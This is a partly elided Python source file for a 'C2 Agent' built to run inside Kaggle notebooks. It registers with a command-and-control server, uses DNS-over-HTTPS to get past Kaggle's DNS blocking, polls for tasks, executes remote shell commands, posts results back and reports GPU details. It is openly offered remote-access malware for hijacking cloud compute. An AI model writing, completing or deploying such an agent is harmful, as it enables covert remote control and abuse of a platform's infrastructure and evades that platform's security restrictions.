#!/usr/bin/env python3
"""C2 Agent — Kaggle Kernel / Notebook.
Handles Kaggle's restricted network (DNS blocking) via DoH fallback."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, ssl, struct
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from base64 import b64encode, b64decode

C2_URLS = [
    os.environ.get("C2_URL", "http://CHANGE_ME:443"),
]
AGENT_ID = os.environ.get("AGENT_ID", str(uuid.uuid4()))
SLEEP    = int(os.environ.get("SLEEP", "5"))

# ─── DoH resolver for Kaggle's blocked DNS ────────────────────────────────────
def doh_resolve(hostname):
    try:
        ...
        resp = opener.open(Request(f"{doh_url}?dns={encoded}", headers={"Accept": "application/dns-message", "User-Agent": "curl"}), timeout=10)
        dns = resp.read()
...
def http_post(path, data):
    ...
    for url in C2_URLS:
        try:
            req = Request(f"{url}{path}", data=json.dumps(data).encode(),
                          headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
            return json.loads(opener.open(req, timeout=30).read())
        except Exception as e:
            time.sleep(2)
    raise Exception("All C2 URLs exhausted")
...
def execute_task(task):
    ...
    try:
        if tt == "cmd":
            ...
            http_post("/api/agent/result", {"task_id": task["id"], "result": "Kaggle agent terminated"})
            os._exit(0)
...
print("[C2] Kaggle agent starting...")
register()
print(f"[C2] Registered as {AGENT_ID} | GPU: {get_gpu_info()}")
